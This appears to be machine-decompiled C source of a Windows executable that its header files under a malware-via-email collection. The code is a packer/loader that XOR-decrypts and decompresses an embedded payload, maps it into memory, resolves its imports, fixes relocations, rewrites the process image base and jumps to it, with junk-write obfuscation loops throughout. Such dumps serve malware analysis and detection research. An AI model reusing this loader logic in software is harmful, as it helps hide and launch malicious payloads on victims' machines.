// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0718/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401030(Eq_213 dwArg04, Eq_208 * dwArg08, Eq_213 dwArg0C)
{
	globals->dw40633C = 0x00000000;
	while (globals->dw40633C < dwArg0C)
	{
		dwArg04[globals->dw40633C] = dwArg08[globals->dw40633C];
		globals->dw40633C = globals->dw40633C + 0x00000001;
	}
	return;
}

void fn004010D0(word32 ebx, word32 esi, word32 edi, Eq_110 * fs)
{
	do
		globals->dw406354 = 0x025F9F3B;
	while (false);
	int32 dwLoc18_22 = 0x00000000;
	while (dwLoc18_22 < 0x00000001)
	{
		globals->dw406354 = 0x00003799;
		dwLoc18_22 = dwLoc18_22 + 0x00000001;
	}
	int32 dwLoc1C_33 = 0x00000000;
	while (dwLoc1C_33 < 0x00000001)
	{
		globals->dw406354 = 0x000022E3;
		dwLoc1C_33 = dwLoc1C_33 + 0x00000001;
	}
	Eq_42 eax_46 = GetModuleHandleA(0x00000000);
	if (RegOpenKeyA(0x80000000, 0x00406280, fp - 0x0000000C) != 0x00000000)
		Mem165[0x00000000:byte] = 0x00;
	up32 edx_65 = globals->dw402001;
	word32 ecx_68 = globals->dw402005;
	up32 dwLoc08_113 = 0x00000000;
	while (dwLoc08_113 <u edx_65)
	{
		do
			globals->dw406354 = 0x8E831298;
		while (false);
		do
			globals->dw406354 = 0xD3B9E6DB;
		while (false);
		int32 dwLoc28_101 = 0x00000000;
		while (dwLoc28_101 < 0x00000001)
		{
			globals->dw406354 = 0x00052196;
			dwLoc28_101 = dwLoc28_101 + 0x00000001;
		}
		(dwLoc08_113 + 0x00402001)->dw0008 = (dwLoc08_113 + 0x00402001)->dw0008 ^ 0x3ADE68B1;
		dwLoc08_113 = dwLoc08_113 + 0x00000008;
	}
	globals->dw40634C = fn00401630(ecx_68);
	fp->dwFFFFFFC4 = globals->dw40634C;
	fp->dwFFFFFFC4 = 0x00402009;
	fn004017F0(0x80000000, 0x00406280, edx_65);
	globals->dw406340 = edi;
	globals->dw406338 = esi;
	globals->dw406348 = ebx;
	globals->ptr406350 = fs->ptr0018;
	globals->dw406344 = fp - 0x00000004;
	word32 eax_147 = 0x00401253 - eax_46;
	fp->dwFFFFFFC4 = eax_147;
	fn00401660(0x00406280, eax_46);
	word32 ecx_153 = globals->dw40634C;
	fn004012B0(fp - 0x00000004, ecx_153);
	Mem150[0x00406358:word32]();
	return;
}

word32 fn00401290(Eq_213 dwArg04, Eq_208 * dwArg08)
{
	return GetProcAddress(dwArg04, dwArg08);
}

void fn004012B0(word32 ebp, word32 dwArg04)
{
	Eq_42 eax_9 = GetModuleHandleA(0x00406288);
	code * eax_17 = GetProcAddress(eax_9, 0x00406298);
	GetProcAddress(eax_9, 0x004062A8);
	code * eax_33 = GetProcAddress(eax_9, 0x004062B8);
	code * eax_41 = GetProcAddress(eax_9, 0x004062CC);
	code * eax_49 = GetProcAddress(eax_9, 0x004062DC);
	GetProcAddress(eax_9, 0x004062EC);
	Eq_207 * edx_66 = dwArg04 + Mem0[dwArg04 + 0x0000003C:word32];
	Eq_213 eax_72 = &edx_66->w0014 + (word32) edx_66->w0014;
	Eq_221 * ebp_201 = fp - 0x00000004;
	eax_41();
	fn00401030(eax_72, dwArg04, dwArg04->dw003C + 0x00000138 + (word32) edx_66->w0006 *s 0x00000028);
	Eq_213 dwLoc30_113 = eax_72;
	up32 dwLoc10_105 = 0x00000000;
	while (dwLoc10_105 <u (word32) edx_66->w0006)
	{
		if (Mem0[dwLoc30_113 + 0x00000014:word32] != 0x00000000 && Mem0[dwLoc30_113 + 0x00000010:word32] != 0x00000000)
		{
			word32 eax_146 = Mem0[dwLoc30_113 + 0x00000010:word32] - 0x00000001 + Mem0[edx_66 + 0x0000003C:word32];
			fn00401030(eax_72 + Mem0[dwLoc30_113 + 0x0000000C:word32], dwArg04 + Mem0[dwLoc30_113 + 0x00000014:word32], SEQ(SEQ(0x00000000, eax_146) % Mem0[edx_66 + 0x0000003C:word32], eax_146) /u Mem0[edx_66 + 0x0000003C:word32] *s Mem0[edx_66 + 0x0000003C:word32]);
		}
		dwLoc30_113 = dwLoc30_113 + 0x00000028;
		dwLoc10_105 = dwLoc10_105 + 0x00000001;
	}
	word32 ecx_174 = eax_72 + Mem0[eax_72 + 0x0000003C:word32];
	word32 eax_180 = Mem0[ecx_174 + 0x00000050:word32];
	word32 * esp_189 = fp - 0x00000084;
	eax_33();
	word32 dwLoc5C_196 = eax_72 + Mem0[ecx_174 + 0x00000080:word32];
	while (dwLoc5C_196->dw0010 != 0x00000000)
	{
		Eq_352 * dwLoc3C_227;
		Eq_353 * dwLoc2C_226;
		word32 edx_218 = eax_72 + Mem0[dwLoc5C_196 + 0x0000000C:word32];
		esp_189 = esp_189 - 0x00000004;
		*esp_189 = edx_218;
		eax_49();
		if (dwLoc5C_196->dw0000 != 0x00000000)
		{
			dwLoc2C_226 = eax_72 + Mem221[dwLoc5C_196 + 0x00000000:word32];
			dwLoc3C_227 = eax_72 + Mem221[dwLoc5C_196 + 0x00000010:word32];
		}
		else
		{
			dwLoc2C_226 = eax_72 + Mem221[dwLoc5C_196 + 0x00000010:word32];
			dwLoc3C_227 = eax_72 + Mem221[dwLoc5C_196 + 0x00000000:word32];
		}
		if (dwLoc5C_196->dw0010 != 0x00000000 && dwLoc5C_196->dw0000 != 0x00000000)
		{
			ebp_201->dwFFFFFFE8 = 0x00000001;
			goto l004014B4;
		}
l004014B4:
		while (dwLoc2C_226->dw0000 != 0x00000000)
		{
			if ((dwLoc2C_226->dw0000 & 0x80000000) != 0x00000000)
			{
				Eq_602 * esp_275 = esp_189 - 0x00000004;
				esp_275->dw0000 = dwLoc2C_226->dw0000 & 0x7FFFFFFF;
				esp_275->dw0004 = dwLoc5C_196;
				dwLoc2C_226->dw0000 = fn00401290(dwArg00, dwArg04);
				esp_189 = esp_275 + 0x00000004;
			}
			else
			{
				Eq_577 * esp_290 = esp_189 - 0x00000004;
				esp_290->dw0000 = dwLoc2C_226->dw0000 + 0x00000002 + eax_72;
				esp_290->dw0004 = dwLoc5C_196;
				dwLoc2C_226->dw0000 = fn00401290(dwArg00, dwArg04);
				esp_189 = esp_290 + 0x00000004;
			}
			if (0x00000000 != 0x00000000)
				dwLoc3C_227->dw0000 = dwLoc2C_226->dw0000;
			dwLoc2C_226 = dwLoc2C_226 + 1;
			dwLoc3C_227 = dwLoc3C_227 + 1;
		}
		dwLoc5C_196 = dwLoc5C_196 + 1;
	}
	word32 ecx_327 = Mem0[ecx_174 + 0x00000034:word32];
	Eq_319 * esp_328 = esp_189 - 0x00000004;
	esp_328->t0000 = ecx_327;
	esp_328->t0000.u0 = 0x00000000;
	esp_328->t0000.u0 = 0x00000000;
	esp_328->t0000.u0 = 0x00000000;
	esp_328->t0000.u0 = 0x00000022;
	Mem340[esp_328 - 0x00000014:word32] = eax_180;
	word32 esp_339 = esp_328 - 0x00000014;
	eax_17();
	globals->t406334 = ecx_174;
	if (globals->t406334 == 0x00000000)
	{
		Mem392[esp_328 - 0x00000018:word32] = Mem341[ecx_174 + 0x00000034:word32];
		word32 esp_394 = esp_328 - 0x00000014;
		if (UnmapViewOfFile(esp_328->t0000) == 0x00000000)
		{
			esp_328->t0000.u0 = 0x00008000;
			esp_328->t0000.u0 = 0x00000000;
			Mem443[esp_328 - 0x00000020:word32] = Mem439[ecx_174 + 0x00000034:word32];
			esp_394 = esp_328 - 0x00000014;
			if (VirtualFree(esp_328->t0000, esp_328->t0000, esp_328->t0000) == 0x00000000)
				;
			else
			{
l0040158B:
				Eq_474 * esp_403 = esp_394 - 0x00000004;
				Mem404[esp_403 + 0x00000000:word32] = Mem392[ecx_174 + 0x00000034:word32];
				esp_403->t0000.u0 = 0x00000000;
				Mem408[esp_403 - 0x00000008:word32] = 0x00000000;
				esp_403->t0000.u0 = 0x00000000;
				esp_403->t0000.u0 = 0x00000022;
				Mem415[esp_403 - 0x00000014:word32] = eax_180;
				globals->t406334 = MapViewOfFileEx(esp_403->t0000, esp_403->t0000, esp_403->t0000, esp_403->t0000, esp_403->t0000, esp_403->t0000);
				esp_339 = &esp_403->t0000;
				if (globals->t406334 == 0x00000000)
				{
					esp_403->t0000.u0 = 0x00000040;
					esp_403->t0000.u0 = 0x00003000;
					Mem428[esp_403 - 0x00000008:word32] = Mem424[ecx_174 + 0x00000050:word32];
					Mem432[esp_403 - 0x0000000C:word32] = Mem428[ecx_174 + 0x00000034:word32];
					globals->t406334 = VirtualAlloc(esp_403->t0000, esp_403->t0000, esp_403->t0000, esp_403->t0000);
					esp_339 = &esp_403->t0000;
				}
l004015D2:
				Eq_404 * esp_359 = esp_339 - 0x00000004;
				esp_359->t0000 = eax_180;
				CloseHandle(esp_359->t0000);
				Mem366[esp_359 + 0x00000000:word32] = Mem360[ecx_174 + 0x00000050:word32];
				esp_359->t0000 = eax_72;
				esp_359->t0000 = globals->t406334;
				fn00401030(dwArg00, dwArg04, dwArg08);
				esp_359->t0000 = globals->t406334;
				fn004017C0(dwArg00);
				Mem384[0x00406358:word32] = Mem378[0x00406334:word32] + Mem378[ecx_174 + 0x00000028:word32];
				Mem387[ecx_174 + 0x00000028:word32] = Mem384[0x00406358:word32];
			}
		}
		else
			goto l0040158B;
	}
	else
		goto l004015D2;
	return;
}

word32 fn00401630(word32 dwArg04)
{
	return VirtualAlloc(0x00000000, dwArg04, 0x00003000, 0x00000004);
}

void fn00401660(word32 dwArg04, Eq_42 dwArg08)
{
fn00401660_entry:
l00401660:
	Eq_213 edx_16 = dwArg08 + Mem0[dwArg08 + 0x0000003C:word32]
	GetProcAddress(GetModuleHandleA(0x00406308), 0x004062F8)()
	globals->t406334 = edx_16;
	branch globals->t406334 != 0x00000000 l004016BE
l004016B4:
	goto l004017AE
l004016BE:
	fn00401030(globals->t406334, dwArg08, Mem44[edx_16 + 0x00000050:word32])
	word32 eax_64 = globals->t406334 - dwArg08
	branch Mem44[edx_16 + 0x000000A4:word32] == 0x00000000 l004017A3
l004016F3:
	word32 dwLoc0C_157 = dwArg08 + Mem44[edx_16 + 0x000000A0:word32]
l00401702:
	branch dwLoc0C_157->dw0004 == 0x00000000 l004017A3
l0040170F:
	uint32 eax_105 = dwLoc0C_157->dw0004 - 0x00000008 >>u 0x00000001
	word16 * ecx_108[] = &dwLoc0C_157->a0008[0]
	uint32 dwLoc08_111 = 0x00000000
	goto l00401738
l0040172F:
	dwLoc08_111 = dwLoc08_111 + 0x00000001;
l00401738:
	branch dwLoc08_111 >=u eax_105 l00401792
l00401740:
	branch (word32) ecx_108[dwLoc08_111] >> 0x0000000C != 0x00000003 l00401790
l00401752:
	(Mem44[0x00406334:word32] + Mem44[dwLoc0C_157 + 0x00000000:word32])[(word32) ecx_108[dwLoc08_111] & 0x00000FFF] = (Mem44[0x00406334:word32] + Mem44[dwLoc0C_157 + 0x00000000:word32])[(word32) ecx_108[dwLoc08_111] & 0x00000FFF] + eax_64;
l00401790:
	goto l0040172F
l00401792:
	dwLoc0C_157 = dwLoc0C_157 + Mem44[dwLoc0C_157 + 0x00000004:word32];
	goto l00401702
l004017A3:
l004017AE:
	return
fn00401660_exit:
}

void fn004017C0(Eq_213 dwArg04)
{
	Eq_112 * edx_7 = globals->ptr406350;
	edx_7->ptr0030->dw0008 = dwArg04;
	return;
}

void fn004017F0(word32 dwArg04, word32 dwArg08, up32 dwArg0C)
{
	byte cl_12 = *dwArg04;
	lstrcpyA(fp + 0xFFFFFF6C, 0x00406328);
	up32 dwLoc0C_118 = 0x00000001;
	word32 dwLoc18_124 = 0x00000000;
	do
	{
		up32 edx_40 = dwLoc0C_118 + 0x00000001;
		byte cl_37 = dwArg04[dwLoc0C_118];
		dwLoc0C_118 = edx_40;
		if ((word32) cl_37 != (word32) cl_12)
		{
			dwArg08[dwLoc18_124] = cl_37;
			dwLoc18_124 = dwLoc18_124 + 0x00000001;
		}
		else if ((word32) dwArg04[edx_40] == 0x00000000)
		{
			dwArg08[dwLoc18_124] = cl_12;
			dwLoc18_124 = dwLoc18_124 + 0x00000001;
			dwLoc0C_118 = edx_40 + 0x00000001;
		}
		else
		{
			word32 eax_104 = fn00401910(fp - 0x00000010, dwArg04 + edx_40) + edx_40;
			dwLoc0C_118 = fn00401910(fp - 0x00000020, dwArg04 + eax_104) + eax_104;
			up32 dwLoc1C_119 = 0x00000000;
			while (dwLoc1C_119 <u dwLoc10)
			{
				dwArg08[dwLoc18_124] = dwArg08[dwLoc18_124 - dwLoc20];
				dwLoc18_124 = dwLoc18_124 + 0x00000001;
				dwLoc1C_119 = dwLoc1C_119 + 0x00000001;
			}
		}
	} while (dwLoc0C_118 <u dwArg0C);
	return;
}

word32 fn00401910(word32 dwArg04, word32 dwArg08)
{
	lstrcpyA(fp - 0x00000084, 0x00406318);
	word32 dwLoc08_19 = 0x00000000;
	word32 dwLoc10_20 = 0x00000000;
	do
	{
		word32 edx_23 = (word32) dwArg08->b0000;
		word32 edx_33 = edx_23 & 0x0000007F | dwLoc08_19 << 0x00000007;
		word32 eax_36 = dwLoc10_20 + 0x00000001;
		dwArg08 = dwArg08 + 1;
		dwLoc08_19 = edx_33;
		dwLoc10_20 = eax_36;
	} while ((edx_23 & 0x00000080) != 0x00000000);
	*dwArg04 = edx_33;
	return eax_36;
}

